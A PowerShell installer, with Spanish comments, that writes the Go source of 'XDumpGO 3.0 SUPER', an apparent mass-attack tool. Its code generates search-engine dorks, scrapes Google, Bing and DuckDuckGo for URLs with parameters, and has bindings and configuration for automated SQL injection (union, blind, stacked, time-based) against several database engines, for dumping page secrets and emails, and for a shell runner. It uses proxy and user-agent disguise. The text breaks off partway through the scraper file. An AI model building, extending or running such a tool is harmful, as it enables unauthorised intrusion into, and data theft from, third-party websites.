# ================================================================
#  XDumpGO 3.0 SUPER - Crea el proyecto completo en tu PC local
#  Base: el original (el.zip) | Motor: Go + WebView2
#  Guardar como: setup-xdumpgo3.ps1
#  Ejecutar:     powershell -ExecutionPolicy Bypass -File setup-xdumpgo3.ps1
# ================================================================
$ErrorActionPreference = "Stop"

# Funciona tanto con -File como pegado en el prompt.
$here = (Get-Location).Path
if ($MyInvocation.MyCommand.Path) {
  $here = Split-Path -Parent $MyInvocation.MyCommand.Path
}
if (Test-Path (Join-Path $here "go.mod")) {
  $root = $here
} else {
  $root = Join-Path $here "xdumpgo3"
}
New-Item -ItemType Directory -Force -Path $root | Out-Null
New-Item -ItemType Directory -Force -Path (Join-Path $root "engine") | Out-Null
New-Item -ItemType Directory -Force -Path (Join-Path $root "web") | Out-Null

function Write-File([string]$path, [string]$content) {
  [System.IO.File]::WriteAllText($path, $content, (New-Object System.Text.UTF8Encoding($false)))
  Write-Host ("  + " + $path)
}

Write-Host "Creando XDumpGO 3.0 SUPER en: $root" -ForegroundColor Cyan

Write-File (Join-Path $root "go.mod") @'
module xdumpgo2

go 1.22

require github.com/jchv/go-webview2 v0.0.0-20260205173254-56598839c808

require (
	github.com/jchv/go-winloader v0.0.0-20250406163304-c1995be93bd1 // indirect
	golang.org/x/sys v0.0.0-20210218145245-beda7e5e158e // indirect
)
'@

Write-File (Join-Path $root "go.sum") @'
github.com/jchv/go-webview2 v0.0.0-20260205173254-56598839c808 h1:ftnsTqIUH57XQEF+PnXX9++nlHCzdkuB5zbWyMMruZo=
github.com/jchv/go-webview2 v0.0.0-20260205173254-56598839c808/go.mod h1:rWifBlzkgrvd7zUqlfq91sWt3473OikgnglnIILx/Jo=
github.com/jchv/go-winloader v0.0.0-20250406163304-c1995be93bd1 h1:njuLRcjAuMKr7kI3D85AXWkw6/+v9PwtV6M6o11sWHQ=
github.com/jchv/go-winloader v0.0.0-20250406163304-c1995be93bd1/go.mod h1:alcuEEnZsY1WQsagKhZDsoPCRoOijYqhZvPwLG0kzVs=
golang.org/x/sys v0.0.0-20200810151505-1b9f1253b3ed/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
golang.org/x/sys v0.0.0-20210218145245-beda7e5e158e h1:f5mksnk+hgXHnImpZoWj64ja99j9zV7YUgrVG95uFE4=
golang.org/x/sys v0.0.0-20210218145245-beda7e5e158e/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=
'@

Write-File (Join-Path $root "main.go") @'
package main

import (
	"context"
	"embed"
	"fmt"
	"io/fs"
	"log"
	"net"
	"net/http"
	"os"
	"time"

	"xdumpgo2/engine"

	webview "github.com/jchv/go-webview2"
)

//go:embed all:web
var webFS embed.FS

func main() {
	// Modo self-test: xdumpgo2.exe -test
	if len(os.Args) > 1 && (os.Args[1] == "-test" || os.Args[1] == "--test") {
		os.Exit(engine.SelfTest())
	}

	log.SetFlags(log.LstdFlags | log.Lshortfile)
	eng := engine.New()

	sub, err := fs.Sub(webFS, "web")
	if err != nil {
		log.Fatalf("cargando UI embebida: %v", err)
	}
	mux := http.NewServeMux()
	mux.Handle("/", http.FileServerFS(sub))

	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		log.Fatalf("escuchando en localhost: %v", err)
	}
	srv := &http.Server{Handler: mux}
	go func() {
		if err := srv.Serve(ln); err != nil && err != http.ErrServerClosed {
			log.Printf("servidor HTTP: %v", err)
		}
	}()

	w := webview.New(false)
	w.SetTitle("XDumpGO " + engine.AppVersion + " PREMIUM | Created by Quartz Inc.")
	w.SetSize(1366, 860, webview.HintNone)

	w.Bind("genDorks",     func(cfg string) string           { return eng.GenDorks(cfg) })
	w.Bind("startScrape",  func(cfg string) string           { return eng.StartScrape(cfg) })
	w.Bind("startExploit", func(cfg string) string           { return eng.StartExploit(cfg) })
	w.Bind("startDump",    func(cfg string) string           { return eng.StartDump(cfg) })
	w.Bind("genShell",     func(cfg string) string           { return eng.GenShell(cfg) })
	w.Bind("startBatch",   func() string                     { return eng.StartBatch() })
	w.Bind("startShell",   func(cfg string) string           { return eng.StartShell(cfg) })
	w.Bind("stopAll",      func() string                     { return eng.StopAll() })
	w.Bind("getStats",     func() string                     { return eng.StatsJSON() })
	w.Bind("getResults",   func(kind string) string          { return eng.ResultsJSON(kind) })
	w.Bind("sendMsg",      func(msg string) string           { return eng.SendMsg(msg) })
	w.Bind("openFile",     func(p string) string             { return eng.OpenFile(p) })
	w.Bind("exportFile",   func(name, content string) string { return eng.ExportFile(name, content) })
	w.Bind("saveConfig",   func(s string) string             { return eng.SaveConfig(s) })
	w.Bind("getConfig",    func() string                     { return eng.ConfigJSON() })

	w.Navigate(fmt.Sprintf("http://127.0.0.1:%d/", ln.Addr().(*net.TCPAddr).Port))
	w.Run()

	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	_ = srv.Shutdown(ctx)
}
'@

Write-File (Join-Path (Join-Path $root "engine") "config.go") @'
package engine

import (
	"encoding/json"
	"os"
	"path/filepath"
)

// AppVersion: versión de la app (se muestra en el título y la UI).
const AppVersion = "3.0"

// ---------- Tipos de configuración persistente ----------

// CoreCfg: núcleo (threads, red, proxy).
type CoreCfg struct {
	Threads    int    `json:"threads"`
	TimeoutSec int    `json:"timeoutSec"`
	Proxy      string `json:"proxy"` // http://user:pass@host:port
	UserAgent  string `json:"userAgent"`
}

// ScrapeCfg: buscador.
type ScrapeCfg struct {
	Engine  string   `json:"engine"` // google|bing|ddg
	PerDork int      `json:"perDork"`
	Pages   int      `json:"pages"`
	Noise   []string `json:"noise"` // hosts extra a descartar
}

// TechCfg: técnicas de SQLi activas.
type TechCfg struct {
	Error   bool `json:"error"`
	Union   bool `json:"union"`
	Blind   bool `json:"blind"`
	Stacked bool `json:"stacked"`
	Time    bool `json:"time"` // time-based (más lento, más preciso)
}

// DBMSCfg: motores de BD a probar.
type DBMSCfg struct {
	Mysql      bool `json:"mysql"`
	Mssql      bool `json:"mssql"`
	Postgresql bool `json:"postgresql"`
	Oracle     bool `json:"oracle"`
}

// ExploiterCfg: inyectores SQLi.
type ExploiterCfg struct {
	Techniques TechCfg `json:"techniques"`
	DBMS       DBMSCfg `json:"dbms"`
	Heuristics bool    `json:"heuristics"` // aceptar BDMS distinto al inyectado
	Intensity  int     `json:"intensity"`  // 1..3 sufijos de comentario
}

// DumpCfg: extracción de páginas.
type DumpCfg struct {
	Workers int  `json:"workers"`
	MaxURLs int  `json:"maxUrls"`
	OnlyOK  bool `json:"onlyOk"`
}

// Config: raíz de xdumpgo3.config.json.
type Config struct {
	Core      CoreCfg      `json:"core"`
	Scrape    ScrapeCfg    `json:"scrape"`
	Exploiter ExploiterCfg `json:"exploiter"`
	Dump      DumpCfg      `json:"dump"`
	OutDir    string       `json:"outDir"`
}

// defaultConfig: valores de fábrica (rápidos y efectivos).
func defaultConfig() Config {
	return Config{
		Core: CoreCfg{
			Threads:    16,
			TimeoutSec: 10,
			UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
		},
		Scrape: ScrapeCfg{
			Engine:  "ddg",
			PerDork: 30,
			Pages:   2,
			Noise:   []string{},
		},
		Exploiter: ExploiterCfg{
			Techniques: TechCfg{Error: true, Union: true, Blind: true, Stacked: true, Time: false},
			DBMS:       DBMSCfg{Mysql: true, Mssql: true, Postgresql: true, Oracle: true},
			Heuristics: true,
			Intensity:  2,
		},
		Dump:   DumpCfg{Workers: 16, MaxURLs: 100},
		OutDir: "",
	}
}

// configPath: xdumpgo3.config.json junto al ejecutable.
func configPath() string {
	if exe, err := os.Executable(); err == nil {
		return filepath.Join(filepath.Dir(exe), "xdumpgo3.config.json")
	}
	return "xdumpgo3.config.json"
}

// loadConfig lee la config de disco (o valores de fábrica).
func loadConfig() Config {
	b, err := os.ReadFile(configPath())
	if err != nil {
		return defaultConfig()
	}
	c := defaultConfig()
	if json.Unmarshal(b, &c) != nil {
		return defaultConfig()
	}
	return c
}
'@

Write-File (Join-Path (Join-Path $root "engine") "engine.go") @'
// Package engine es el motor de XDumpGO 3.0 SUPER:
// genera dorks, raspa buscadores, explota SQLi, voltea (dump) páginas
// y ejecuta comandos de shell. Basado en el original, más rápido.
package engine

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ---------- Tipos de estado ----------

// JobStat: progreso del job activo.
type JobStat struct {
	Name   string  `json:"name"`
	Done   int64   `json:"done"`
	Total  int     `json:"total"`
	Speed  float64 `json:"speed"` // items/segundo
	Active bool    `json:"active"`
}

// Stats: estado global que consulta la UI.
type Stats struct {
	Running    bool    `json:"running"`
	Job        JobStat `json:"job"`
	ElapsedSec float64 `json:"elapsedSec"`
	Dorks      int     `json:"dorks"`
	URLs       int     `json:"urls"`
	Exploits   int     `json:"exploits"`
	Dumps      int     `json:"dumps"`
	Shell      int     `json:"shell"`
}

// LogEntry: línea del log interno.
type LogEntry struct {
	TS   string `json:"ts"`
	Kind string `json:"kind"` // info|ok|warn|err
	Msg  string `json:"msg"`
}

// Dork: dork generada.
type Dork struct {
	ID      int    `json:"id"`
	Text    string `json:"text"`
	Keyword string `json:"keyword"`
	Domain  string `json:"domain"`
}

// URLItem: URL candidata encontrada.
type URLItem struct {
	ID     int      `json:"id"`
	Raw    string   `json:"raw"`
	Host   string   `json:"host"`
	Path   string   `json:"path"`
	Params []string `json:"params"`
	Source string   `json:"source"` // dork que la produjo
	Status int      `json:"status"`
	OK     bool     `json:"ok"`
}

// Exploit: hallazgo SQLi.
type Exploit struct {
	ID        int    `json:"id"`
	URL       string `json:"url"`
	Param     string `json:"param"`
	Technique string `json:"technique"` // error|union|blind|stacked|time
	DBMS      string `json:"dbms"`
	Version   string `json:"version"`
	Finding   string `json:"finding"`
}

// Dump: contenido extraído de una página.
type Dump struct {
	ID         int      `json:"id"`
	URL        string   `json:"url"`
	Title      string   `json:"title"`
	Status     int      `json:"status"`
	Size       int      `json:"size"`
	DurationMs int64    `json:"durationMs"`
	Emails     []string `json:"emails"`
	Links      []string `json:"links"`
	Forms      []string `json:"forms"`
	JSFiles    []string `json:"jsFiles"`
	Secrets    []string `json:"secrets"`
	Comments   []string `json:"comments"`
}

// ShellOut: salida de un comando.
type ShellOut struct {
	Cmd  string `json:"cmd"`
	Out  string `json:"out"`
	Err  string `json:"err"`
	Exit int    `json:"exit"`
}

// ShellBatch: resultado de un lote de comandos.
type ShellBatch struct {
	Total int `json:"total"`
	OK    int `json:"ok"`
	Path  string `json:"path,omitempty"`
}

// Resp: respuesta genérica de las acciones.
type Resp struct {
	OK    bool   `json:"ok"`
	Error string `json:"error,omitempty"`
	Count int    `json:"count,omitempty"`
	Path  string `json:"path,omitempty"`
}

// ---------- Motor ----------

// Engine concentra estado, workers, cliente HTTP y config.
type Engine struct {
	mu        sync.Mutex
	conf      Config
	dorks     []Dork
	urls      []URLItem
	urlSeen   map[string]bool
	exploits  []Exploit
	dumps     []Dump
	shellOut  []ShellOut
	logs      []LogEntry
	jobName   string
	jobTotal  int
	done      int64
	start     time.Time
	client    *http.Client
	bufPool   *sync.Pool
	ctx       context.Context
	cancel    context.CancelFunc
}

// New crea el motor (carga config de disco si existe).
func New() *Engine {
	ctx, cancel := context.WithCancel(context.Background())
	e := &Engine{
		ctx:     ctx,
		cancel:  cancel,
		urlSeen: make(map[string]bool),
		logs:    make([]LogEntry, 0, 512),
		bufPool: &sync.Pool{New: func() any { return make([]byte, 512*1024) }},
	}
	e.conf = loadConfig()
	e.client = newClient(e.conf)
	e.start = time.Now()
	e.log("ok", "Motor XDumpGO "+AppVersion+" SUPER inicializado")
	return e
}

// ---------- Helpers ----------

func marshal(v any) string {
	b, err := json.Marshal(v)
	if err != nil {
		return `{"ok":false,"error":"` + strings.ReplaceAll(err.Error(), `"`, "'") + `"}`
	}
	return string(b)
}

// cfg devuelve la config con defaults aplicados.
func (e *Engine) cfg() Config {
	e.mu.Lock()
	defer e.mu.Unlock()
	c := e.conf
	if c.Core.Threads <= 0 {
		c.Core.Threads = 16
	}
	if c.Core.TimeoutSec <= 0 {
		c.Core.TimeoutSec = 10
	}
	if c.Core.UserAgent == "" {
		c.Core.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
	}
	if c.Scrape.Engine == "" {
		c.Scrape.Engine = "ddg"
	}
	if c.Scrape.PerDork <= 0 {
		c.Scrape.PerDork = 30
	}
	if c.Scrape.Pages <= 0 {
		c.Scrape.Pages = 2
	}
	if c.Dump.Workers <= 0 {
		c.Dump.Workers = c.Core.Threads
	}
	if c.Dump.MaxURLs <= 0 {
		c.Dump.MaxURLs = 100
	}
	if c.Exploiter.Intensity < 1 {
		c.Exploiter.Intensity = 2
	}
	if c.Exploiter.Intensity > 3 {
		c.Exploiter.Intensity = 3
	}
	return c
}

func (e *Engine) log(kind, msg string) {
	e.mu.Lock()
	e.logs = append(e.logs, LogEntry{
		TS:   time.Now().Format("15:04:05"),
		Kind: kind,
		Msg:  msg,
	})
	if len(e.logs) > 1000 {
		e.logs = e.logs[len(e.logs)-1000:]
	}
	e.mu.Unlock()
}

// startJob prepara un job nuevo (cancela el anterior si sigue vivo).
func (e *Engine) startJob(name string, total int) context.Context {
	e.mu.Lock()
	if e.ctx.Err() == nil {
		e.cancel()
	}
	e.ctx, e.cancel = context.WithCancel(context.Background())
	e.jobName = name
	e.jobTotal = total
	atomic.StoreInt64(&e.done, 0)
	e.start = time.Now()
	ctx := e.ctx
	e.mu.Unlock()
	e.log("info", fmt.Sprintf("Job %q iniciado (%d elementos)", name, total))
	return ctx
}

func (e *Engine) endJob(name string) {
	e.mu.Lock()
	if e.ctx.Err() == nil {
		e.cancel()
	}
	e.mu.Unlock()
	e.log("ok", fmt.Sprintf("Job %q finalizado", name))
}

// parallel ejecuta fn(0..total-1) con `workers` goroutines (semáforo).
func (e *Engine) parallel(ctx context.Context, workers, total int, fn func(ctx context.Context, i int)) {
	if workers < 1 {
		workers = 1
	}
	sem := make(chan struct{}, workers)
	var wg sync.WaitGroup
	for i := 0; i < total; i++ {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(i int) {
			defer wg.Done()
			defer func() { <-sem }()
			fn(ctx, i)
		}(i)
	}
	wg.Wait()
}

// markURL actualiza el último estado HTTP de una URL.
func (e *Engine) markURL(id, status int) {
	e.mu.Lock()
	for i := range e.urls {
		if e.urls[i].ID == id {
			e.urls[i].Status = status
			e.urls[i].OK = status >= 200 && status < 400
			break
		}
	}
	e.mu.Unlock()
}

// ---------- HTTP (rápido: HTTP/2, keep-alive, DNS cache, pool de buffers) ----------

const maxBodyBytes = 4 * 1024 * 1024 // tope de 4 MB por respuesta

// newClient construye un cliente con pool de conexiones reutilizables.
func newClient(c Config) *http.Client {
	var proxy func(*http.Request) (*url.URL, error)
	if p := strings.TrimSpace(c.Core.Proxy); p != "" {
		if u, err := url.Parse(p); err == nil {
			proxy = http.ProxyURL(u)
		}
	}
	d := &net_Dialer{Timeout: 3 * time.Second}
	tr := &http.Transport{
		Proxy:                proxy,
		DialContext:          d.DialContext,
		MaxIdleConns:         512,
		MaxIdleConnsPerHost:  256,
		IdleConnTimeout:      90 * time.Second,
		TLSHandshakeTimeout:  10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		ForceAttemptHTTP2:    true,
	}
	return &http.Client{
		Transport: tr,
		Timeout:   time.Duration(c.Core.TimeoutSec) * time.Second,
	}
}

// fetch hace GET y devuelve (status, cuerpo). El cuerpo se limita a maxBodyBytes.
func (e *Engine) fetch(ctx context.Context, rawURL, ua string) (int, string, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rawURL, nil)
	if err != nil {
		return 0, "", err
	}
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,es;q=0.8")
	resp, err := e.client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	buf := e.bufPool.Get().([]byte)
	defer e.bufPool.Put(buf)

	var sb strings.Builder
	sb.Grow(64 * 1024)
	for {
		n, rerr := resp.Body.Read(buf)
		if n > 0 {
			sb.Write(buf[:n])
		}
		if rerr != nil {
			break
		}
		if sb.Len() > maxBodyBytes {
			break
		}
	}
	return resp.StatusCode, sb.String(), nil
}

// fetchCtx hace GET con un timeout propio (para probes SQLi: más rápido).
func (e *Engine) fetchCtx(parent context.Context, timeout time.Duration, rawURL, ua string) (int, string, error) {
	cctx, cancel := context.WithTimeout(parent, timeout)
	defer cancel()
	return e.fetch(cctx, rawURL, ua)
}

// ---------- Config (UI) ----------

// ConfigJSON devuelve la config actual (para la UI).
func (e *Engine) ConfigJSON() string {
	return marshal(e.cfg())
}

// SaveConfig guarda la config en memoria y en disco.
func (e *Engine) SaveConfig(s string) string {
	var c Config
	if err := json.Unmarshal([]byte(s), &c); err != nil {
		return marshal(Resp{OK: false, Error: "JSON inválido: " + err.Error()})
	}
	e.mu.Lock()
	e.conf = c
	e.client = newClient(c) // aplica proxy/timeout nuevos
	e.mu.Unlock()
	if err := os.WriteFile(configPath(), []byte(marshal(c)), 0o644); err != nil {
		e.log("warn", "Config en memoria pero no en disco: " + err.Error())
	} else {
		e.log("ok", "Config guardada en " + configPath())
	}
	return marshal(Resp{OK: true})
}

// ---------- Estado / resultados ----------

// StatsJSON devuelve el estado global.
func (e *Engine) StatsJSON() string {
	e.mu.Lock()
	defer e.mu.Unlock()
	st := Stats{
		Dorks:    len(e.dorks),
		URLs:     len(e.urls),
		Exploits: len(e.exploits),
		Dumps:    len(e.dumps),
		Shell:    len(e.shellOut),
	}
	running := e.ctx.Err() == nil
	st.Running = running
	st.Job.Active = running
	st.Job.Name = e.jobName
	st.Job.Done = atomic.LoadInt64(&e.done)
	st.Job.Total = e.jobTotal
	if running && !e.start.IsZero() {
		el := time.Since(e.start).Seconds()
		st.ElapsedSec = el
		if el > 0.05 {
			st.Job.Speed = float64(st.Job.Done) / el
		}
	}
	return marshal(st)
}

// ResultsJSON devuelve los resultados por tipo: dorks|urls|exploits|dumps|shell|logs.
func (e *Engine) ResultsJSON(kind string) string {
	e.mu.Lock()
	defer e.mu.Unlock()
	switch strings.ToLower(strings.TrimSpace(kind)) {
	case "dorks":
		return marshal(e.dorks)
	case "urls":
		return marshal(e.urls)
	case "exploits":
		return marshal(e.exploits)
	case "dumps":
		return marshal(e.dumps)
	case "shell":
		return marshal(e.shellOut)
	case "logs":
		return marshal(e.logs)
	default:
		return marshal(Resp{OK: false, Error: "tipo desconocido: " + kind})
	}
}

// SendMsg registra un mensaje del UI.
func (e *Engine) SendMsg(msg string) string {
	e.log("info", strings.TrimSpace(msg))
	return marshal(Resp{OK: true})
}

// StopAll cancela el job en curso.
func (e *Engine) StopAll() string {
	e.mu.Lock()
	running := e.ctx.Err() == nil
	if running {
		e.cancel()
	}
	e.mu.Unlock()
	if running {
		e.log("warn", "StopAll: job cancelado")
	}
	return marshal(Resp{OK: true})
}

// OpenFile abre una ruta con la app predeterminada del SO.
func (e *Engine) OpenFile(p string) string {
	p = strings.TrimSpace(p)
	if p == "" {
		return marshal(Resp{OK: false, Error: "ruta vacía"})
	}
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("rundll32", "url.dll,FileProtocolHandler", p)
	case "darwin":
		cmd = exec.Command("open", p)
	default:
		cmd = exec.Command("xdg-open", p)
	}
	if err := cmd.Start(); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	go cmd.Wait()
	return marshal(Resp{OK: true})
}

// ExportFile escribe `content` en OutDir/name y devuelve la ruta.
func (e *Engine) ExportFile(name, content string) string {
	c := e.cfg()
	outDir := c.OutDir
	if outDir == "" {
		outDir = filepath.Join(filepath.Dir(configPath()), "exports")
	}
	name = filepath.Base(strings.TrimSpace(name))
	if name == "" || name == "." {
		name = time.Now().Format("export-20060102-150405.txt")
	}
	if err := os.MkdirAll(outDir, 0o755); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	p := filepath.Join(outDir, name)
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	e.log("ok", "Exportado: " + p)
	return marshal(Resp{OK: true, Path: p})
}

// SelfTest verifica el motor (xdumpgo2.exe -test). Devuelve 0 si OK.
func SelfTest() int {
	e := New()
	if e.cfg().Core.Threads <= 0 {
		fmt.Println("self-test: threads inválidos")
		return 1
	}
	e.GenDorks(`{"keywords":["inurl:admin"],"domains":["example.com"],"max":10}`)
	if len(e.dorks) == 0 {
		fmt.Println("self-test: GenDorks no produjo nada")
		return 1
	}
	e.log("ok", "self-test OK")
	fmt.Println("self-test OK: motor " + AppVersion + " listo")
	return 0
}
'@

Write-File (Join-Path (Join-Path $root "engine") "dorks.go") @'
package engine

import (
	"encoding/json"
	"fmt"
	"strings"
)

// DorkCfg configura la generación de dorks.
type DorkCfg struct {
	Keywords []string `json:"keywords"`
	Domains  []string `json:"domains"`
	Params   []string `json:"params"`
	Max      int      `json:"max"`
	Modes    []string `json:"modes"` // "site", "inurl"
}

// GenDorks genera combinaciones de dorks (sin duplicados) y las guarda en el motor.
func (e *Engine) GenDorks(cfg string) string {
	var c DorkCfg
	if err := json.Unmarshal([]byte(cfg), &c); err != nil {
		return marshal(Resp{OK: false, Error: "JSON inválido: " + err.Error()})
	}
	if c.Max <= 0 {
		c.Max = 500
	}
	if len(c.Modes) == 0 {
		c.Modes = []string{"site"}
	}

	seen := make(map[string]bool)
	var out []Dork
	add := func(text, kw, dom string) {
		text = strings.TrimSpace(text)
		if text == "" || seen[text] {
			return
		}
		seen[text] = true
		out = append(out, Dork{ID: len(out), Text: text, Keyword: kw, Domain: dom})
	}

	// Sin dominios: cada keyword es una dork global.
	if len(c.Domains) == 0 {
		for _, kw := range c.Keywords {
			kw = strings.TrimSpace(kw)
			if kw == "" {
				continue
			}
			add(kw, kw, "")
			if len(out) >= c.Max {
				break
			}
		}
	} else {
		for _, rawDom := range c.Domains {
			dom := strings.TrimSpace(rawDom)
			dom = strings.TrimPrefix(strings.TrimPrefix(dom, "https://"), "http://")
			dom = strings.Trim(dom, "/")
			if dom == "" {
				continue
			}
			for _, kw := range c.Keywords {
				kw = strings.TrimSpace(kw)
				if kw == "" {
					continue
				}
				for _, mode := range c.Modes {
					switch mode {
					case "site":
						add(fmt.Sprintf("site:%s %s", dom, kw), kw, dom)
						if len(out) >= c.Max {
							goto done
						}
					case "inurl":
						for _, p := range c.Params {
							p = strings.TrimSpace(p)
							if p == "" {
								continue
							}
							add(fmt.Sprintf("site:%s inurl:%s %s", dom, p, kw), kw, dom)
							if len(out) >= c.Max {
								goto done
							}
						}
					}
				}
			}
		}
	}
done:
	if len(out) == 0 {
		return marshal(Resp{OK: false, Error: "sin dorks: revisa keywords/domains"})
	}
	e.mu.Lock()
	e.dorks = out
	e.mu.Unlock()
	e.log("ok", fmt.Sprintf("%d dorks generadas", len(out)))
	return marshal(Resp{OK: true, Count: len(out)})
}
'@

Write-File (Join-Path (Join-Path $root "engine") "scrape.go") @'
package engine

import (
	"context"
	"encoding/json"
	"fmt"
	"html"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"sync/atomic"
)

// ScrapeCfgUI configura el raspado de buscadores.
type ScrapeCfgUI struct {
	Dorks   []string `json:"dorks"` // vacío => usar dorks generadas
	Engine  string   `json:"engine"` // google|bing|ddg
	Workers int      `json:"workers"`
	PerDork int      `json:"perDork"`
	Pages   int      `json:"pages"`
}

var (
	// Google: enlaces /url?q=... (principal)
	reGoogleURL = regexp.MustCompile(`href="(/url\?q=([^&"<>]+))"`)
	// Google/Bing: enlaces absolutos (fallback + URLs JS)
	reAbsURL    = regexp.MustCompile(`https?://[a-zA-Z0-9\-._~:/?#@!$&*+,;=%\[\]]+`)
	// Bing: resultados dentro de <h2><a href>
	reBingResult = regexp.MustCompile(`(?s)<h2[^>]*>\s*<a[^>]+href="([^"]+)"`)
	// DDG: resultados dentro de <a class="result__a" href>
	reDDGResult = regexp.MustCompile(`(?s)<a[^>]+class="result__a"[^>]+href="([^"]+)"`)
)

// noiseHosts: dominios que casi siempre son ruido.
var noiseHosts = map[string]bool{
	"google.com": true, "googleapis.com": true, "gstatic.com": true,
	"ggpht.com": true, "googleusercontent.com": true, "youtube.com": true,
	"bing.com": true, "microsoft.com": true, "msn.com": true,
	"w3.org": true, "schema.org": true, "ytimg.com": true,
	"duckduckgo.com": true, "duckduckgo.co": true,
	"facebook.com": true, "fb.com": true, "twitter.com": true, "x.com": true,
	"linkedin.com": true, "pinterest.com": true, "instagram.com": true,
	"cloudflare.com": true, "cloudfront.net": true, "akamaihd.net": true,
	"github.com": true, "githubusercontent.com": true, "gravatar.com": true,
	"youtube-nocookie.com": true, "doubleclick.net": true, "scorecardresearch.com": true,
}

// StartScrape lanza el job de raspado (async).
func (e *Engine) StartScrape(cfg string) string {
	var c ScrapeCfgUI
	if err := json.Unmarshal([]byte(cfg), &c); err != nil {
		return marshal(Resp{OK: false, Error: err.Error()})
	}
	conf := e.cfg()
	if c.Engine == "" {
		c.Engine = conf.Scrape.Engine
	}
	if c.Workers <= 0 {
		c.Workers = conf.Core.Threads
	}
	if c.PerDork <= 0 {
		c.PerDork = conf.Scrape.PerDork
	}
	if c.Pages <= 0 {
		c.Pages = conf.Scrape.Pages
	}
	if c.Pages > 5 {
		c.Pages = 5
	}

	var dorks []string
	if len(c.Dorks) > 0 {
		for _, d := range c.Dorks {
			if d = strings.TrimSpace(d); d != "" {
				dorks = append(dorks, d)
			}
		}
	} else {
		e.mu.Lock()
		for _, d := range e.dorks {
			dorks = append(dorks, d.Text)
		}
		e.mu.Unlock()
	}
	if len(dorks) == 0 {
		return marshal(Resp{OK: false, Error: "sin dorks: géneralas primero o pásalas en cfg.dorks"})
	}

	total := len(dorks) * c.Pages
	ctx := e.startJob("scrape", total)
	go func() {
		defer e.endJob("scrape")
		e.parallel(ctx, c.Workers, total, func(ctx context.Context, i int) {
			di := i / c.Pages
			page := i % c.Pages
			e.scrapeDorkPage(ctx, dorks[di], c.Engine, c.PerDork, page, conf.Core.UserAgent)
			atomic.AddInt64(&e.done, 1)
		})
	}()
	return marshal(Resp{OK: true, Count: total})
}

func (e *Engine) scrapeDorkPage(ctx context.Context, dork, eng string, perDork, page int, ua string) {
	q := url.Values{}
	q.Set("q", dork)
	var base string
	switch eng {
	case "bing":
		base = "https://www.bing.com/search"
		q.Set("count", strconv.Itoa(perDork))
		q.Set("first", strconv.Itoa(page*perDork+1))
	case "ddg":
		base = "https://html.duckduckgo.com/html/"
		q.Set("kl", "us-en")
		q.Set("kp", "us")
		if page > 0 {
			q.Set("s", strconv.Itoa(page*30))
		}
	default:
		base = "https://www.google.com/search"
		q.Set("num", strconv.Itoa(perDork))
		q.Set("start", strconv.Itoa(page*10))
	}
	status, body, err := e.fetch(ctx, base+"?"+q.Encode(), ua)
	if err != nil {
		e.log("warn", "scrape: "+err.Error())
		return
	}
	if status != 200 {
		e.log("warn", fmt.Sprintf("scrape: HTTP %d en dork %q (p%d)", status, dork, page))
		return
	}
	n := 0
	for _, raw := range extractLinks(body, eng) {
		if ctx.Err() != nil {
			return
		}
		if e.addURL(raw, dork) {
			n++
		}
	}
	if n > 0 {
		e.log("info", fmt.Sprintf("scrape: %d URLs nuevas de %q (p%d)", n, dork, page))
	}
}

// addURL normaliza una URL, descarta ruido y la guarda si es nueva.
func (e *Engine) addURL(raw, source string) bool {
	u, err := url.Parse(strings.TrimSpace(raw))
	if err != nil || (u.Scheme != "http" && u.Scheme != "https") || u.Host == "" {
		return false
	}
	host := strings.ToLower(u.Hostname())
	if noiseHosts[host] {
		return false
	}
	// Dedup por host+path+query (mejor que host+path: no pierde variantes ?id=).
	key := host + u.Path
	if u.RawQuery != "" {
		key += "?" + u.RawQuery
	}
	e.mu.Lock()
	if e.urlSeen[key] {
		e.mu.Unlock()
		return false
	}
	e.urlSeen[key] = true
	item := URLItem{
		ID:     len(e.urls),
		Raw:    u.String(),
		Host:   host,
		Path:   u.Path,
		Params: paramNames(u),
		Source: source,
	}
	e.urls = append(e.urls, item)
	e.mu.Unlock()
	return true
}

func paramNames(u *url.URL) []string {
	seen := make(map[string]bool)
	var out []string
	for k := range u.Query() {
		if seen[k] {
			continue
		}
		seen[k] = true
		out = append(out, k)
	}
	return out
}

// cleanBingURL quita parámetros de tracking de Bing.
func cleanBingURL(raw string) string {
	u, err := url.Parse(raw)
	if err != nil {
		return raw
	}
	q := u.Query()
	for _, k := range []string{"ck", "sb", "c", "wls", "ts", "pid", "b", "mkt", "FORM", "form", "qs", "pq", "src"} {
		q.Del(k)
	}
	u.RawQuery = q.Encode()
	return u.String()
}

// extractLinks saca URLs de la HTML de resultados de google/bing/ddg.
func extractLinks(body, eng string) []string {
	seen := make(map[string]bool)
	var out []string
	add := func(s string) {
		s = html.UnescapeString(strings.TrimSpace(s))
		if s == "" || seen[s] {
			return
		}
		seen[s] = true
		out = append(out, s)
	}
	if eng == "bing" {
		for _, m := range reBingResult.FindAllStringSubmatch(body, -1) {
			add(cleanBingURL(m[1]))
		}
		if len(out) == 0 {
			for _, s := range reAbsURL.FindAllString(body, -1) {
				low := strings.ToLower(s)
